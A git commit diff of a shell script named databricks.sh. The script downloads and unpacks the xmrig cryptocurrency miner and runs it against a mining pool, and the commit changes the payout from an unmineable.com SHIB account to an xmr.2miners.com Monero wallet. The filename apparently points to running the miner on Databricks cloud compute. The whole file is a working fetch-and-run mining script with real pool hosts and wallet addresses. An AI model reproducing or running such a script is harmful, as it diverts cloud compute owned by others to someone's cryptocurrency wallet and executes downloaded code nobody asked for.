8b9236baa557dcc89ed2c049118d41133369154a
aabu3572 <107196414+aabu3572@users.noreply.github.com>
2022-06-10 09:02:43 +0400

    Update databricks.sh

--- databricks.sh
+++ databricks.sh
@@ -9,4 +9,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u SHIB:0x43b2625658E4561316dE65035F4C749bb85Eb221.RIG1 -p x
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48fb6CwXF6U2sYiaU6t9PUf9Hirpg1PwpUy5pJ1xp7d5XprW6XHmnFvRTAUQCefMCVMnXbVM6S6VkLzeRyiSjreSNhk9UVt.XMR00PcChr -p x
